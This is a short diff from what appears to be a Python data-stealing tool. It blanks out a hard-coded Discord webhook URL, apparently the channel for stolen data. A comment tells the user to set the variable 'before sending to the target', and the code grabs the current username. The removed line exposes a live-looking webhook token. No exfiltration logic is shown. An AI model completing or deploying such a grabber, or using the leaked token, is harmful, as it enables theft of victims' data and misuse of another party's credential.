@@ -12,7 +12,7 @@ import sqlite3
 from getpass import getuser
 # DEFINE THIS VARIABLE BEFORE SENDING TO THE TARGET
 
-webhook_url = "https://discord.com/api/webhooks/1041420477769461942/Kb1c0FEArsay5IjY6rHrawoudMWaN5II9OKQxBU4MPH3ezz1uzYWJgB2dr8EBkp81oyV"
+webhook_url = ""
 current_username = getuser()
 
 class checkSystem:
